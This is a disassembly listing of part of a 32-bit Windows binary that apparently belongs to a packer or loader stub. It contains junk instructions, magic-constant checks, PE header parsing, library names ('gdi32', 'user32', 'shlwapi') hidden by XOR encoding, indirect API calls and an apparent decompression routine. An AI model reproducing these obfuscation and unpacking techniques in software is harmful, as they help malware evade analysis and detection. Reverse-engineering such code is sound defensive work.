  423e2b:	mov    eax,DWORD PTR [ebp+0x8]
  423e2e:	push   esi
  423e2f:	or     DWORD PTR ds:0x428e8b,edx
  423e35:	mov    esi,DWORD PTR [ebp+0x8]
  423e38:	add    esi,DWORD PTR [eax+0x3c]
  423e3b:	sbb    DWORD PTR ds:0x428e23,0x3013
  423e45:	mov    DWORD PTR [ebp+0x8],esi
  423e48:	sbb    DWORD PTR ds:0x428e6b,0x1c7d
  423e52:	mov    eax,DWORD PTR [ebp-0x4]
  423e55:	mov    esi,DWORD PTR ds:0x428e6b
  423e5b:	adc    esi,DWORD PTR ds:0x428e2f
  423e61:	mov    DWORD PTR ds:0x428e6b,esi
  423e67:	mov    esi,DWORD PTR [ebp+0x8]
  423e6a:	adc    DWORD PTR ds:0x428ecf,0x428ea3
  423e74:	xor    eax,ecx
  423e76:	add    eax,edx
  423e78:	cmp    DWORD PTR [esi+0x54],eax
  423e7b:	pop    esi
  423e7c:	je     0x423e8a
  423e82:	mov    eax,DWORD PTR [ebp+0x8]
  423e85:	jmp    0x423e91
  423e8a:	mov    eax,DWORD PTR [ebp-0x4]
  423e8d:	xor    eax,ecx
  423e8f:	add    eax,edx
  423e91:	leave  
  423e92:	ret    0x4
  423e95:	push   ebp
  423e96:	mov    ebp,esp
  423e98:	sub    esp,0xc
  423e9b:	push   esi
  423e9c:	or     DWORD PTR ds:0x428eaf,ebx
  423ea2:	mov    esi,0xf89c85a5
  423ea7:	and    DWORD PTR ds:0x428e97,0x0
  423eb1:	jmp    0x423ec3
  423eb6:	mov    edx,DWORD PTR ds:0x428e97
  423ebc:	inc    edx
  423ebd:	mov    DWORD PTR ds:0x428e97,edx
  423ec3:	cmp    DWORD PTR ds:0x428e97,0x10
  423eca:	jae    0x423f0a
  423ed0:	cmp    DWORD PTR ds:0x428e97,0x8
  423ed7:	jg     0x423f0a
  423edd:	jmp    0x423eeb
  423ee2:	push   DWORD PTR [ebp-0x20]
  423ee5:	call   DWORD PTR ds:0x42aa3b
  423eeb:	cmp    DWORD PTR ds:0x428e97,0x7
  423ef2:	jne    0x423f05
  423ef8:	mov    edx,DWORD PTR ds:0x428e97
  423efe:	inc    edx
  423eff:	mov    DWORD PTR ds:0x428e97,edx
  423f05:	jmp    0x423eb6
  423f0a:	mov    DWORD PTR [ebp-0x8],esi
  423f0d:	and    DWORD PTR ds:0x428e67,0x0
  423f17:	jmp    0x423f29
  423f1c:	mov    edx,DWORD PTR ds:0x428e67
  423f22:	inc    edx
  423f23:	mov    DWORD PTR ds:0x428e67,edx
  423f29:	cmp    DWORD PTR ds:0x428e67,0x1a
  423f30:	jae    0x423f78
  423f36:	cmp    DWORD PTR ds:0x428e67,0x4
  423f3d:	jle    0x423f78
  423f43:	jmp    0x423f59
  423f48:	push   DWORD PTR [ebp-0x18]
  423f4b:	push   0x428e67
  423f50:	push   DWORD PTR [ebp-0x18]
  423f53:	call   DWORD PTR ds:0x42aa3f
  423f59:	cmp    DWORD PTR ds:0x428e67,0x3
  423f60:	jne    0x423f73
  423f66:	mov    edx,DWORD PTR ds:0x428e67
  423f6c:	inc    edx
  423f6d:	mov    DWORD PTR ds:0x428e67,edx
  423f73:	jmp    0x423f1c
  423f78:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  423f7f:	push   edi
  423f80:	adc    DWORD PTR ds:0x428e87,0x34d1
  423f8a:	mov    eax,eax
  423f8c:	mov    eax,DWORD PTR [ebp-0x4]
  423f8f:	movzx  edx,BYTE PTR ds:0x428e97
  423f96:	add    DWORD PTR ds:0x428ecf,edx
  423f9c:	mov    edi,DWORD PTR [ebp-0x8]
  423f9f:	mov    ecx,DWORD PTR ds:0x429747
  423fa5:	mov    ecx,DWORD PTR [ecx]
  423fa7:	sub    DWORD PTR ds:0x428ecb,ecx
  423fad:	mov    ecx,0x75108af
  423fb2:	xor    eax,ecx
  423fb4:	xor    edi,ecx
  423fb6:	mov    edx,0x3272f6
  423fbb:	add    edi,edx
  423fbd:	add    eax,edx
  423fbf:	imul   eax,edi
  423fc2:	mov    edi,DWORD PTR [ebp+0xc]
  423fc5:	cmp    edi,eax
  423fc7:	je     0x42401c
  423fcd:	mov    DWORD PTR [ebp-0xc],esi
  423fd0:	mov    eax,DWORD PTR [ebp-0xc]
  423fd3:	mov    esi,DWORD PTR [ebp+0xc]
  423fd6:	xor    eax,ecx
  423fd8:	lea    eax,[eax*8+0x1939828]
  423fdf:	mov    eax,DWORD PTR [esi+eax*1]
  423fe2:	mov    DWORD PTR [ebp+0xc],eax
  423fe5:	mov    eax,DWORD PTR [ebp-0x4]
  423fe8:	mov    esi,DWORD PTR [ebp-0x8]
  423feb:	xor    eax,ecx
  423fed:	xor    esi,ecx
  423fef:	add    esi,edx
  423ff1:	add    eax,edx
  423ff3:	imul   eax,esi
  423ff6:	mov    esi,DWORD PTR [ebp+0xc]
  423ff9:	cmp    esi,eax
  423ffb:	je     0x42401c
  424001:	mov    eax,DWORD PTR [ebp-0x4]
  424004:	xor    eax,ecx
  424006:	mov    ecx,DWORD PTR [ebp+0xc]
  424009:	add    eax,edx
  42400b:	imul   eax,ecx
  42400e:	add    eax,DWORD PTR [ebp+0x8]
  424011:	mov    DWORD PTR [ebp+0xc],eax
  424014:	mov    eax,DWORD PTR [ebp+0xc]
  424017:	jmp    0x42402d
  42401c:	mov    eax,DWORD PTR [ebp-0x4]
  42401f:	mov    esi,DWORD PTR [ebp-0x8]
  424022:	xor    esi,ecx
  424024:	xor    eax,ecx
  424026:	add    esi,edx
  424028:	add    eax,edx
  42402a:	imul   eax,esi
  42402d:	pop    edi
  42402e:	pop    esi
  42402f:	leave  
  424030:	ret    0x8
	...
  424043:	add    BYTE PTR [ebp-0x44],al
  424046:	mov    edi,0x4d
  42404b:	add    BYTE PTR [edx],al
  42404d:	add    BYTE PTR [eax],al
  42404f:	add    BYTE PTR [ecx+0x0],al
  424052:	add    BYTE PTR [eax],al
  424054:	pusha  
  424055:	inc    eax
  424056:	add    al,BYTE PTR [eax]
  424058:	pusha  
  424059:	xor    al,0x2
  42405b:	add    BYTE PTR [eax],al
  42405d:	add    BYTE PTR [eax],al
  42405f:	add    BYTE PTR [edx+0x53],dl
  424062:	inc    esp
  424063:	push   ebx
  424064:	fild   WORD PTR [ebx]
  424066:	and    eax,0x3a172832
  42406b:	dec    esi
  42406c:	xchg   ecx,eax
  42406d:	cdq    
  42406e:	scas   al,BYTE PTR es:[edi]
  42406f:	femms  
  424071:	(bad)  
  424072:	lds    ebp,FWORD PTR [ecx+eax*1+0x43000000]
  424079:	cmp    bl,BYTE PTR [esi+eax*2+0x6f]
  42407d:	ins    BYTE PTR es:[edi],dx
  42407e:	fs gs jb 0x4240a2
  424082:	outs   dx,DWORD PTR ds:[esi]
  424083:	data16 and BYTE PTR [edi+0x6f],dl
  424087:	jb     0x4240f4
  424089:	imul   ebp,DWORD PTR [esi+0x67],0x6f725020
  424090:	push   0x65
  424092:	arpl   WORD PTR [esp+ebx*2+0x50],si
  424096:	jb     0x424107
  424098:	push   0x65
  42409a:	arpl   WORD PTR [esp+edx*2+0x65],si
  42409e:	jae    0x424114
  4240a0:	add    BYTE PTR [ebx-0x137e13ab],cl
  4240a6:	or     BYTE PTR [ecx],al
  4240a8:	add    BYTE PTR [eax],al
  4240aa:	push   ebx
  4240ab:	mov    eax,ebx
  4240ad:	xchg   ecx,eax
  4240ae:	mov    eax,DWORD PTR [ebp+0x8]
  4240b1:	cmp    eax,0xf89c85a5
  4240b6:	jne    0x424542
  4240bc:	mov    eax,DWORD PTR [ebp+0xc]
  4240bf:	cmp    eax,0xf89c85a4
  4240c4:	jne    0x424542
  4240ca:	mov    eax,DWORD PTR [ebp+0x24]
  4240cd:	mov    DWORD PTR [ebp-0x4],eax
  4240d0:	mov    eax,DWORD PTR [ebp-0x4]
  4240d3:	mov    eax,DWORD PTR [eax+0x1d8]
  4240d9:	mov    eax,DWORD PTR [eax]
  4240db:	mov    eax,DWORD PTR [eax]
  4240dd:	mov    DWORD PTR [ebp-0x8],eax
  4240e0:	mov    BYTE PTR [ebp-0x18],0x1c
  4240e4:	mov    BYTE PTR [ebp-0x17],0x1f
  4240e8:	mov    BYTE PTR [ebp-0x16],0x1a
  4240ec:	mov    BYTE PTR [ebp-0x15],0x50
  4240f0:	mov    BYTE PTR [ebp-0x14],0x51
  4240f4:	mov    BYTE PTR [ebp-0x13],0x83
  4240f8:	mov    BYTE PTR [ebp-0x20],0xe
  4240fc:	mov    BYTE PTR [ebp-0x1f],0x10
  424100:	mov    BYTE PTR [ebp-0x1e],0x1e
  424104:	mov    BYTE PTR [ebp-0x1d],0x11
  424108:	mov    BYTE PTR [ebp-0x1c],0x50
  42410c:	mov    BYTE PTR [ebp-0x1b],0x51
  424110:	mov    BYTE PTR [ebp-0x1a],0x83
  424114:	mov    BYTE PTR [ebp-0x28],0x10
  424118:	mov    BYTE PTR [ebp-0x27],0x1b
  42411c:	mov    BYTE PTR [ebp-0x26],0x17
  424120:	mov    BYTE PTR [ebp-0x25],0xc
  424124:	mov    BYTE PTR [ebp-0x24],0x22
  424128:	mov    BYTE PTR [ebp-0x23],0x13
  42412c:	mov    BYTE PTR [ebp-0x22],0x1a
  424130:	mov    BYTE PTR [ebp-0x21],0x83
  424134:	xor    ecx,ecx
  424136:	lea    eax,[ebp+ecx*1-0x18]
  42413a:	movzx  edx,BYTE PTR [eax]
  42413d:	xor    edx,0x7f
  424140:	add    edx,0x4
  424143:	inc    ecx
  424144:	mov    BYTE PTR [eax],dl
  424146:	cmp    ecx,0x6
  424149:	jb     0x424136
  42414b:	xor    ecx,ecx
  42414d:	lea    eax,[ebp+ecx*1-0x20]
  424151:	movzx  edx,BYTE PTR [eax]
  424154:	xor    edx,0x7f
  424157:	add    edx,0x4
  42415a:	inc    ecx
  42415b:	mov    BYTE PTR [eax],dl
  42415d:	cmp    ecx,0x7
  424160:	jb     0x42414d
  424162:	xor    ecx,ecx
  424164:	lea    eax,[ebp+ecx*1-0x28]
  424168:	movzx  edx,BYTE PTR [eax]
  42416b:	xor    edx,0x7f
  42416e:	add    edx,0x4
  424171:	inc    ecx
  424172:	mov    BYTE PTR [eax],dl
  424174:	cmp    ecx,0x8
  424177:	jb     0x424164
  424179:	lea    eax,[ebp-0x2c]
  42417c:	mov    DWORD PTR [ebp-0x8],eax
  42417f:	mov    ecx,DWORD PTR [ebp-0x8]
  424182:	mov    eax,0x7113fccf
  424187:	push   esi
  424188:	mov    DWORD PTR [ecx],eax
  42418a:	mov    ecx,DWORD PTR [ebp-0x2c]
  42418d:	mov    esi,0x4e38
  424192:	push   edi
  424193:	lea    edi,[esi-0x6]
  424196:	mov    ebx,0x3272f6
  42419b:	cmp    ecx,eax
  42419d:	jne    0x42426e
  4241a3:	lea    eax,[esi+0x3f]
  4241a6:	mov    WORD PTR [ebp-0x78],ax
  4241aa:	mov    eax,esi
  4241ac:	mov    WORD PTR [ebp-0x76],ax
  4241b0:	add    eax,0x45
  4241b3:	mov    WORD PTR [ebp-0x74],ax
  4241b7:	lea    eax,[esi+0x6]
  4241ba:	mov    WORD PTR [ebp-0x72],ax
  4241be:	add    eax,0x41
  4241c1:	mov    WORD PTR [ebp-0x70],ax
  4241c5:	mov    eax,edi
  4241c7:	mov    WORD PTR [ebp-0x6e],ax
  4241cb:	mov    eax,0x4f94
  4241d0:	mov    WORD PTR [ebp-0x6c],ax
  4241d4:	lea    eax,[esi-0x7]
  4241d7:	mov    WORD PTR [ebp-0x6a],ax
  4241db:	add    eax,0x30
  4241de:	mov    WORD PTR [ebp-0x68],ax
  4241e2:	lea    eax,[esi-0x3]
  4241e5:	mov    WORD PTR [ebp-0x66],ax
  4241e9:	mov    eax,esi
  4241eb:	mov    WORD PTR [ebp-0x64],ax
  4241ef:	add    eax,0xfffffffc
  4241f2:	mov    WORD PTR [ebp-0x62],ax
  4241f6:	mov    eax,0x443
  4241fb:	mov    WORD PTR [ebp-0x60],ax
  4241ff:	mov    eax,0x5672
  424204:	mov    WORD PTR [ebp-0x5e],ax
  424208:	mov    eax,0x6112
  42420d:	mov    WORD PTR [ebp-0x5c],ax
  424211:	mov    eax,0xf1e0
  424216:	mov    WORD PTR [ebp-0x5a],ax
  42421a:	mov    eax,edi
  42421c:	mov    WORD PTR [ebp-0x58],ax
  424220:	lea    eax,[ebp-0xe0]
  424226:	push   eax
  424227:	mov    eax,DWORD PTR [ebp+0xc]
  42422a:	xor    eax,0x75108af
  42422f:	add    eax,ebx
  424231:	push   eax
  424232:	lea    eax,[ebp-0x78]
  424235:	push   eax
  424236:	mov    eax,DWORD PTR [ebp-0x4]
  424239:	mov    eax,DWORD PTR [eax+0x198]
  42423f:	mov    DWORD PTR [ebp-0xe0],0x1
  424249:	mov    DWORD PTR [ebp-0xdc],0xffff
  424253:	push   DWORD PTR [eax]
  424255:	mov    eax,DWORD PTR [ebp+0x10]
  424258:	call   eax
  42425a:	mov    DWORD PTR [ebp-0x8],eax
  42425d:	mov    eax,DWORD PTR [ebp-0x8]
  424260:	test   eax,eax
  424262:	je     0x42426e
  424264:	xor    DWORD PTR ds:0xe041cc1,0x9f170bd0
  42426e:	mov    eax,DWORD PTR [ebp-0x4]
  424271:	mov    ecx,DWORD PTR [eax+0x18c]
  424277:	xor    eax,eax
  424279:	cmp    DWORD PTR [ecx],eax
  42427b:	jne    0x4244b2
  424281:	mov    ecx,DWORD PTR [ebp-0x4]
  424284:	mov    ecx,DWORD PTR [ecx+0x17c]
  42428a:	mov    DWORD PTR [ecx],eax
  42428c:	mov    ecx,DWORD PTR [ebp-0x4]
  42428f:	mov    ecx,DWORD PTR [ecx+0x180]
  424295:	mov    DWORD PTR [ecx],eax
  424297:	mov    eax,0x4e6d
  42429c:	mov    WORD PTR [ebp-0x9c],ax
  4242a3:	mov    eax,esi
  4242a5:	mov    WORD PTR [ebp-0x9a],ax
  4242ac:	mov    eax,0x4e7d
  4242b1:	mov    WORD PTR [ebp-0x98],ax
  4242b8:	add    eax,0xffffffc0
  4242bb:	mov    WORD PTR [ebp-0x96],ax
  4242c2:	mov    eax,0x4f88
  4242c7:	mov    WORD PTR [ebp-0x94],ax
  4242ce:	mov    eax,0x4e3c
  4242d3:	mov    WORD PTR [ebp-0x92],ax
  4242da:	mov    eax,esi
  4242dc:	mov    WORD PTR [ebp-0x8c],ax
  4242e3:	mov    eax,0x4e31
  4242e8:	mov    WORD PTR [ebp-0x8a],ax
  4242ef:	mov    eax,0x99fd
  4242f4:	mov    WORD PTR [ebp-0x88],ax
  4242fb:	mov    eax,0x8d6c
  424300:	mov    WORD PTR [ebp-0x86],ax
  424307:	mov    eax,0xd66f
  42430c:	mov    WORD PTR [ebp-0x84],ax
  424313:	mov    BYTE PTR [ebp-0x10],0x10
  424317:	mov    eax,0xd783
  42431c:	mov    WORD PTR [ebp-0x82],ax
  424323:	mov    BYTE PTR [ebp-0xf],0x1b
  424327:	mov    eax,0x2782
  42432c:	mov    BYTE PTR [ebp-0xe],0x17
  424330:	mov    WORD PTR [ebp-0x80],ax
  424334:	mov    BYTE PTR [ebp-0xd],0xc
  424338:	mov    eax,0x4782
  42433d:	mov    BYTE PTR [ebp-0xc],0x22
  424341:	mov    WORD PTR [ebp-0x7e],ax
  424345:	mov    eax,0x4e33
  42434a:	mov    BYTE PTR [ebp-0xb],0x13
  42434e:	push   0x8
  424350:	mov    BYTE PTR [ebp-0xa],0x1a
  424354:	mov    WORD PTR [ebp-0x7c],ax
  424358:	mov    BYTE PTR [ebp-0x9],0x83
  42435c:	mov    DWORD PTR [ebp-0x90],0x4e324e61
  424366:	lea    eax,[ebp-0x10]
  424369:	pop    edi
  42436a:	movzx  ecx,BYTE PTR [eax]
  42436d:	xor    ecx,0x7f
  424370:	add    ecx,0x4
  424373:	mov    BYTE PTR [eax],cl
  424375:	inc    eax
  424376:	dec    edi
  424377:	jne    0x42436a
  424379:	mov    DWORD PTR [ebp-0xe0],0x1
  424383:	lea    eax,[ebp-0x10]
  424386:	mov    DWORD PTR [ebp-0xdc],eax
  42438c:	mov    ecx,0x4e60
  424391:	mov    eax,ecx
  424393:	mov    WORD PTR [ebp-0x40],ax
  424397:	add    eax,0xb
  42439a:	mov    edx,eax
  42439c:	mov    WORD PTR [ebp-0x3e],dx
  4243a0:	mov    edx,0x4f93
  4243a5:	mov    WORD PTR [ebp-0x3c],dx
  4243a9:	add    edx,0xfffffff8
  4243ac:	mov    WORD PTR [ebp-0x3a],dx
  4243b0:	mov    edx,0x4f89
  4243b5:	mov    WORD PTR [ebp-0x38],dx
  4243b9:	add    edx,0x5
  4243bc:	mov    WORD PTR [ebp-0x36],dx
  4243c0:	mov    edx,0x4f87
  4243c5:	mov    WORD PTR [ebp-0x34],dx
  4243c9:	mov    WORD PTR [ebp-0x32],cx
  4243cd:	mov    ecx,esi
  4243cf:	mov    WORD PTR [ebp-0x30],cx
  4243d3:	lea    ecx,[edx-0x7]
  4243d6:	mov    edx,ecx
  4243d8:	mov    WORD PTR [ebp-0x54],dx
  4243dc:	mov    edx,eax
  4243de:	mov    WORD PTR [ebp-0x52],dx
  4243e2:	mov    edx,0x4e73
  4243e7:	mov    WORD PTR [ebp-0x50],dx
  4243eb:	mov    WORD PTR [ebp-0x4e],ax
  4243ef:	lea    eax,[edx-0xa]
  4243f2:	mov    WORD PTR [ebp-0x4c],ax
  4243f6:	add    eax,0x5
  4243f9:	mov    WORD PTR [ebp-0x4a],ax
  4243fd:	lea    eax,[edx-0xc]
  424400:	mov    WORD PTR [ebp-0x48],ax
  424404:	mov    WORD PTR [ebp-0x46],cx
  424408:	mov    WORD PTR [ebp-0x44],si
  42440c:	mov    ecx,DWORD PTR [ebp+0x8]
  42440f:	movzx  edx,WORD PTR [ebp-0x54]
  424413:	mov    eax,0x75108af
  424418:	xor    ecx,eax
  42441a:	add    ecx,ebx
  42441c:	xor    ecx,edx
  42441e:	mov    WORD PTR [ebp-0x54],cx
  424422:	mov    ecx,DWORD PTR [ebp+0x8]
  424425:	xor    ecx,eax
  424427:	movzx  eax,WORD PTR [ebp-0x40]
  42442b:	add    ecx,ebx
  42442d:	xor    ecx,eax
  42442f:	xor    eax,eax
  424431:	mov    WORD PTR [ebp-0x40],cx
  424435:	mov    WORD PTR [ebp-0xf4],ax
  42443c:	mov    WORD PTR [ebp-0x108],ax
  424443:	mov    edi,DWORD PTR [ebp+0x24]
  424446:	lea    eax,[ebp-0xf4]
  42444c:	lea    edx,[ebp-0x54]
  42444f:	mov    DWORD PTR [ebp-0xe0],0x2
  424459:	mov    DWORD PTR [ebp-0xdc],eax
  42445f:	call   0x426ea1
  424464:	mov    ecx,DWORD PTR [ebp+0x8]
  424467:	mov    DWORD PTR [ebp-0xd8],eax
  42446d:	mov    eax,0x75108af
  424472:	xor    ecx,eax
  424474:	add    ecx,ebx
  424476:	je     0x424495
  424478:	lea    ecx,[ebp-0xe0]
  42447e:	push   ecx
  42447f:	mov    ecx,DWORD PTR [ebp+0xc]
  424482:	xor    ecx,eax
  424484:	add    ecx,ebx
  424486:	push   ecx
  424487:	lea    eax,[ebp-0x9c]
  42448d:	push   eax
  42448e:	mov    eax,DWORD PTR [ebp+0x10]
  424491:	push   0x0
  424493:	call   eax
  424495:	mov    edi,DWORD PTR [ebp+0x24]
  424498:	lea    eax,[ebp-0x108]
  42449e:	lea    edx,[ebp-0x40]
  4244a1:	mov    DWORD PTR [ebp-0xdc],eax
  4244a7:	call   0x426ea1
  4244ac:	mov    DWORD PTR [ebp-0xd8],eax
  4244b2:	mov    eax,DWORD PTR [ebp+0x14]
  4244b5:	push   DWORD PTR [ebp-0x4]
  4244b8:	push   DWORD PTR [ebp+0x20]
  4244bb:	push   DWORD PTR [ebp+0x1c]
  4244be:	push   DWORD PTR [ebp+0x18]
  4244c1:	push   DWORD PTR [ebp+0x10]
  4244c4:	push   DWORD PTR [ebp+0x8]
  4244c7:	push   DWORD PTR [ebp+0xc]
  4244ca:	call   0x425742
  4244cf:	test   eax,eax
  4244d1:	je     0x424518
  4244d3:	add    DWORD PTR [ebp-0x4],eax
  4244d6:	push   DWORD PTR [ebp-0x4]
  4244d9:	lea    esi,[ebp+0x4]
  4244dc:	call   0x424930
  4244e1:	mov    eax,DWORD PTR [ebp-0x4]
  4244e4:	mov    eax,DWORD PTR [eax+0x1c8]
  4244ea:	mov    eax,DWORD PTR [eax]
  4244ec:	xor    eax,0x75108af
  4244f1:	add    eax,ebx
  4244f3:	mov    eax,DWORD PTR [ebp-0x4]
  4244f6:	jne    0x42450e
  4244f8:	mov    ecx,DWORD PTR [ebp-0x4]
  4244fb:	mov    ecx,DWORD PTR [ecx+0x1cc]
  424501:	push   DWORD PTR [ecx]
  424503:	mov    eax,DWORD PTR [eax+0x1e0]
  424509:	call   DWORD PTR [eax+0x28]
  42450c:	jmp    0x424518
  42450e:	mov    eax,DWORD PTR [eax+0x17c]
  424514:	mov    eax,DWORD PTR [eax]
  424516:	add    DWORD PTR [esi],eax
  424518:	mov    eax,DWORD PTR [ebp-0x4]
  42451b:	mov    eax,DWORD PTR [eax+0x1dc]
  424521:	dec    DWORD PTR [eax]
  424523:	mov    ecx,DWORD PTR [ebp-0x4]
  424526:	mov    ecx,DWORD PTR [ecx+0x1d8]
  42452c:	mov    eax,DWORD PTR [eax]
  42452e:	lea    eax,[ecx+eax*4]
  424531:	mov    ecx,DWORD PTR [ebp-0x4]
  424534:	mov    ecx,DWORD PTR [ecx+0x17c]
  42453a:	mov    eax,DWORD PTR [eax]
  42453c:	mov    ecx,DWORD PTR [ecx]
  42453e:	add    DWORD PTR [eax],ecx
  424540:	pop    edi
  424541:	pop    esi
  424542:	pop    ebx
  424543:	leave  
  424544:	ret    0x20
  424547:	push   edi
  424548:	push   esi
  424549:	push   ebx
  42454a:	push   ebp
  42454b:	mov    ebp,esp
  42454d:	mov    eax,DWORD PTR [ebp+0x24]
  424550:	add    DWORD PTR [ebp+0x28],eax
  424553:	push   eax
  424554:	cld    
  424555:	mov    esi,DWORD PTR [ebp+0x18]
  424558:	add    DWORD PTR [ebp+0x1c],esi
  42455b:	push   esi
  42455c:	mov    esi,DWORD PTR [ebp+0x14]
  42455f:	lods   eax,DWORD PTR ds:[esi]
  424560:	xchg   edx,eax
  424561:	push   edx
  424562:	mov    cl,BYTE PTR [esi-0x2]
  424565:	or     eax,0xffffffff
  424568:	shl    eax,cl
  42456a:	not    eax
  42456c:	push   eax
  42456d:	mov    cl,dh
  42456f:	or     eax,0xffffffff
  424572:	shl    eax,cl
  424574:	not    eax
  424576:	push   eax
  424577:	add    cl,dl
  424579:	mov    edi,esi
  42457b:	sub    esp,0xc
  42457e:	sub    eax,eax
  424580:	inc    eax
  424581:	push   eax
  424582:	push   eax
  424583:	push   eax
  424584:	push   eax
  424585:	push   eax
  424586:	push   edi
  424587:	sub    esi,esi
  424589:	push   esi
  42458a:	or     ebx,0xffffffff
  42458d:	mov    eax,0x300
  424592:	shl    eax,cl
  424594:	lea    ecx,[eax+0x736]
  42459a:	mov    eax,0x4000400
  42459f:	shr    ecx,1
  4245a1:	rep stos DWORD PTR es:[edi],eax
  4245a3:	push   0x5
  4245a5:	pop    ecx
  4245a6:	call   0x424891
  4245ab:	loop   0x4245a6
  4245ad:	lea    esi,[esi]
  4245af:	lea    edi,[edi]
  4245b1:	mov    edi,DWORD PTR [ebp-0x4]
  4245b4:	mov    eax,DWORD PTR [ebp-0x10]
  4245b7:	sub    edi,DWORD PTR [ebp+0x24]
  4245ba:	and    eax,edi
  4245bc:	mov    DWORD PTR [ebp-0x18],eax
  4245bf:	mov    al,0x0
  4245c1:	call   0x4248a9
  4245c6:	jne    0x424661
  4245cc:	mov    cl,BYTE PTR [ebp-0xc]
  4245cf:	and    edi,DWORD PTR [ebp-0x14]
  4245d2:	shl    edi,cl
  4245d4:	sub    cl,0x8
  4245d7:	neg    cl
  4245d9:	shr    esi,cl
  4245db:	pop    eax
  4245dc:	add    edi,esi
  4245de:	pop    esi
  4245df:	lea    edi,[edi+edi*2]
  4245e2:	shl    edi,0x8
  4245e5:	cmp    al,0x7
  4245e7:	pop    edx
  4245e8:	lea    ecx,[esi+edi*2+0xe6c]
  4245ef:	push   ecx
  4245f0:	push   esi
  4245f1:	mov    esi,0x100
  4245f6:	push   eax
  4245f7:	mov    al,0x1
  4245f9:	jb     0x42462f
  4245fb:	mov    edi,DWORD PTR [ebp-0x4]
  4245fe:	sub    edi,DWORD PTR [ebp-0x24]
  424601:	movzx  edi,BYTE PTR [edi]
  424604:	mov    ebp,DWORD PTR [ebp-0x34]
  424607:	shl    edi,1
  424609:	mov    ecx,esi
  42460b:	and    esi,edi
  42460d:	add    ecx,esi
  42460f:	lea    ebp,[ebp+ecx*2+0x0]
  424613:	call   0x4248c8
  424618:	mov    ecx,eax
  42461a:	shr    esi,0x8
  42461d:	and    ecx,0x1
  424620:	cmp    esi,ecx
  424622:	mov    esi,0x100
  424627:	jne    0x424637
  424629:	cmp    eax,esi
  42462b:	jb     0x424604
  42462d:	jmp    0x424643
  42462f:	mov    ebp,DWORD PTR [ebp-0x34]
  424632:	call   0x4248c8
  424637:	inc    eax
  424638:	inc    esi
  424639:	sub    eax,0x1
  42463c:	sub    esi,0x1
  42463f:	cmp    eax,esi
  424641:	jb     0x42462f
  424643:	pop    edx
  424644:	inc    edx
  424645:	cmp    edx,0x5
  424648:	dec    edx
  424649:	mov    ecx,edx
  42464b:	jb     0x42465c
  42464d:	inc    edx
  42464e:	cmp    edx,0xb
  424651:	dec    edx
  424652:	mov    cl,0x4
  424654:	dec    cl
  424656:	jb     0x42465c
  424658:	mov    cl,0x7
  42465a:	dec    cl
  42465c:	sub    edx,ecx
  42465e:	push   edx
  42465f:	jmp    0x4246b0
  424661:	mov    al,0xc1
  424663:	dec    al
  424665:	call   0x4248b9
  42466a:	jne    0x424680
  42466c:	pop    eax
  42466d:	pop    edi
  42466e:	pop    edx
  42466f:	pop    ecx
  424670:	pop    edx
  424671:	pop    ecx
  424672:	push   DWORD PTR [esp]
  424675:	push   ecx
  424676:	push   edx
  424677:	mov    edx,0x664
  42467c:	mov    cl,0x0
  42467e:	jmp    0x4246f3
  424680:	mov    al,0xcd
  424682:	dec    al
  424684:	call   0x4248b9
  424689:	jne    0x4246b9
  42468b:	mov    al,0xf1
  42468d:	dec    al
  42468f:	call   0x4248a9
  424694:	jne    0x4246e9
  424696:	pop    eax
  424697:	cmp    al,0x7
  424699:	mov    al,0x9
  42469b:	jb     0x42469f
  42469d:	mov    al,0xb
  42469f:	push   eax
  4246a0:	mov    esi,DWORD PTR [ebp-0x4]
  4246a3:	sub    esi,DWORD PTR [ebp-0x24]
  4246a6:	cmp    esi,DWORD PTR [ebp+0x24]
  4246a9:	jb     0x424880
  4246af:	lods   al,BYTE PTR ds:[esi]
  4246b0:	mov    edi,DWORD PTR [ebp-0x4]
  4246b3:	stos   BYTE PTR es:[edi],al
  4246b4:	jmp    0x424847
  4246b9:	mov    al,0xd8
  4246bb:	call   0x4248b9
  4246c0:	mov    esi,DWORD PTR [ebp-0x28]
  4246c3:	je     0x4246e0
  4246c5:	mov    al,0xe4
  4246c7:	call   0x4248b9
  4246cc:	mov    esi,DWORD PTR [ebp-0x2c]
  4246cf:	je     0x4246da
  4246d1:	mov    esi,DWORD PTR [ebp-0x30]
  4246d4:	mov    ecx,DWORD PTR [ebp-0x2c]
  4246d7:	mov    DWORD PTR [ebp-0x30],ecx
  4246da:	mov    ecx,DWORD PTR [ebp-0x28]
  4246dd:	mov    DWORD PTR [ebp-0x2c],ecx
  4246e0:	mov    ecx,DWORD PTR [ebp-0x24]
  4246e3:	mov    DWORD PTR [ebp-0x28],ecx
  4246e6:	mov    DWORD PTR [ebp-0x24],esi
  4246e9:	pop    eax
  4246ea:	pop    edi
  4246eb:	pop    ecx
  4246ec:	mov    edx,0xa68
  4246f1:	mov    cl,0x8
  4246f3:	add    edx,edi
  4246f5:	push   edx
  4246f6:	push   edi
  4246f7:	cmp    al,0x7
  4246f9:	mov    al,cl
  4246fb:	jb     0x4246ff
  4246fd:	add    al,0x3
  4246ff:	push   eax
  424700:	mov    ebp,DWORD PTR [ebp-0x34]
  424703:	call   0x4248c6
  424708:	jne    0x42471e
  42470a:	mov    eax,DWORD PTR [ebp-0x18]
  42470d:	mov    edi,DWORD PTR [ebp-0x34]
  424710:	shl    eax,0x3
  424713:	sub    ecx,ecx
  424715:	push   0x8
  424717:	pop    esi
  424718:	lea    edi,[edi+eax*2+0x4]
  42471c:	jmp    0x424753
  42471e:	mov    ebp,DWORD PTR [ebp-0x34]
  424721:	add    ebp,0x2
  424724:	call   0x4248c6
  424729:	jne    0x424743
  42472b:	mov    eax,DWORD PTR [ebp-0x18]
  42472e:	mov    edi,DWORD PTR [ebp-0x34]
  424731:	shl    eax,0x3
  424734:	push   0x8
  424736:	pop    ecx
  424737:	push   0x8
  424739:	pop    esi
  42473a:	lea    edi,[edi+eax*2+0x104]
  424741:	jmp    0x424753
  424743:	mov    edi,0x204
  424748:	add    edi,DWORD PTR [ebp-0x34]
  42474b:	push   0x10
  42474d:	pop    ecx
  42474e:	mov    esi,0x100
  424753:	mov    DWORD PTR [ebp-0x1c],ecx
  424756:	sub    eax,eax
  424758:	inc    eax
  424759:	mov    ebp,edi
  42475b:	call   0x4248c8
  424760:	mov    ecx,eax
  424762:	sub    ecx,esi
  424764:	jb     0x424759
  424766:	add    DWORD PTR [ebp-0x1c],ecx
  424769:	cmp    DWORD PTR [ebp-0x3c],0x4
  42476d:	jae    0x424823
  424773:	add    DWORD PTR [ebp-0x3c],0x7
  424777:	mov    ecx,DWORD PTR [ebp-0x1c]
  42477a:	cmp    ecx,0x4
